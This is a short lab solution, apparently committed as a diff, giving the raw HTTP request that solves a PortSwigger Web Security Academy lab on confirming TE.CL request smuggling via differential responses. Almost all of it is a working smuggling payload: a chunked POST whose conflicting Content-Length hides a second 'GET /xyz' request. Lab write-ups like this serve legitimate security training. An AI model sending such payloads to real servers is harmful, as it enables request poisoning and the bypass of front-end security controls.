@@ -1,0 +1,20 @@
+The HTTP request at the bottom of this page is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 4
+
+A2
+GET /xyz HTTP/1.1
+Host: 0ad0000c0373f6da8225ab48004f006a.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+hello=
+0
+
+
